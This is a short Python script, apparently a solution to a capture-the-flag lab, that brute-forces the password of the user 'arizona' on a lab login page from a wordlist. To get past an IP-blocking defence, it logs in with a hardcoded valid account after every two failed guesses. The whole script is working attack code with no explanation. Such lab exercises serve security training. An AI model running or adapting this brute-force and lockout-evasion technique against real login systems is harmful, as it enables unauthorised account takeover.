import requests
url = "https://labs.matesctf.org/lab/auth/4/index.php?page=login"
f_password = open("./wordlist/passwords_blockip.txt", "r").read().splitlines()

credential = {
  "username" : "armstrong",
  "password" : "strongpow"
}
count = 0
for p in f_password:
  if(count == 2):
    credent = requests.post(url, data= credential, allow_redirects=False)
    count = 0
  x = requests.post(url, data= {
    "username" : "arizona",
    "password" : p
  }, allow_redirects=False)
  print p
  if(x.status_code == 302):
    print("===Success====" + p)
    break
  count += 1